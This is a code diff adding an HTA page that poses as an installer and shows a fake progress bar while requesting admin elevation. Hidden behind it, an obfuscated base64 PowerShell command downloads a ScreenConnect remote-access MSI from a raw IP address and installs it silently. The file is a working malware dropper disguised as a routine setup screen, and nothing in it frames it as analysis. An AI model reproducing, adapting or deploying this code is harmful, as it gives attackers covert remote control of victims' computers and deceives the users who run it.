@@ -1,0 +1,92 @@
+<html>
+<head>
+<title>Processing...</title>
+<hta:application 
+    id="oHTA"
+    applicationname="MSIInstallerHTA"
+    border="thin"
+    borderstyle="normal"
+    caption="yes"
+    maximizebutton="no"
+    minimizebutton="no"
+    showintaskbar="yes"
+    singleinstance="yes"
+    sysmenu="yes"
+    scroll="no"
+    windowstate="normal"
+/>
+<style>
+    body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; color: #333; margin: 0; padding: 0; background: #f7f7f7; overflow: hidden; }
+    .content-area { padding-top: 40px; }
+    h3 { color: #333; font-weight: normal; margin-bottom: 20px; }
+    #main { width: 340px; height: 28px; border: 1px solid #555; border-radius: 4px; margin: auto; background: #ddd; position: relative; }
+    #fill { height: 100%; width: 0%; background: #4CAF50; border-radius: 3px; }
+    #percent { font-size: 14px; color: #333; margin-top: 10px; }
+</style>
+<script language="VBScript">
+    Dim i
+    i = 0
+
+    Sub Window_OnLoad
+        ' Set Window Size
+        window.resizeTo 450, 240
+        ' Center Window
+        Dim x, y
+        x = (screen.width - 450) / 2
+        y = (screen.height - 240) / 2
+        window.moveTo x, y
+
+        ' Simple check for elevation
+        ' If we don't have a specific flag, we re-run as admin
+        If InStr(oHTA.commandLine, "/admin") = 0 Then
+            On Error Resume Next
+            CreateObject("Shell.Application").ShellExecute "mshta.exe", Chr(34) & document.location.pathname & Chr(34) & " /admin", "", "runas", 1
+            If Err.Number = 0 Then
+                window.close
+                Exit Sub
+            End If
+            On Error GoTo 0
+        End If
+
+        ' Start the installation process
+        window.setTimeout "RunInstall", 1000
+    End Sub
+
+    Sub RunInstall
+        On Error Resume Next
+        Dim shell, ps
+        Set shell = CreateObject("WScript.Shell")
+        
+        ' Encoded PowerShell command from original VBS
+        ps = "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AMQA0ADYALgAxADgANQAuADIAMwA5AC4ANwAwADoAOAAwADQAMAAvAEIAaQBuAC8AUwBjAHIAZQBlAG4AQwBvAG4AbgBlAGMAdAAuAEMAbABpAGUAbgB0AFMAZQB0AHUAcAAuAG0AcwBpAD8AZQA9AEEAYwBjAGUAcwBzACYAeQA9AEcAdQBlAHMAdAAiAAoAJABwAGEAdABoACAAPQAgACIAJABlAG4AdgA6AFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFMAYwByAGUAZQBuAEMAbwBuAG4AZQBjAHQALgBDAGwAaQBlAG4AdABTAGUAdAB1AHAALgBtAHMAaQAiAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACQAdQByAGwAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAHAAYQB0AGgACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAbQBzAGkAZQB4AGUAYwAuAGUAeABlACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgACIALwBpACAAJABwAGEAdABoACAALwBxAG4AIAAvAG4AbwByAGUAcwB0AGEAcgB0ACIAIAAtAFcAYQBpAHQAIg=="
+        
+        ' Execute PowerShell (Hidden)
+        shell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & ps, 0, False
+        
+        ' Start Progress Bar Animation
+        UpdateProgress
+    End Sub
+
+    Sub UpdateProgress
+        If i <= 100 Then
+            document.getElementById("fill").style.width = i & "%"
+            document.getElementById("percent").innerText = i & "%"
+            i = i + 1
+            window.setTimeout "UpdateProgress", 100
+        Else
+            MsgBox "Process completed successfully!", vbInformation, "Done"
+            window.close
+        End If
+    End Sub
+</script>
+</head>
+<body>
+    <div class="content-area">
+        <h3>Please wait...</h3>
+        <div id="main">
+            <div id="fill"></div>
+        </div>
+        <p id="percent">0%</p>
+    </div>
+</body>
+</html>
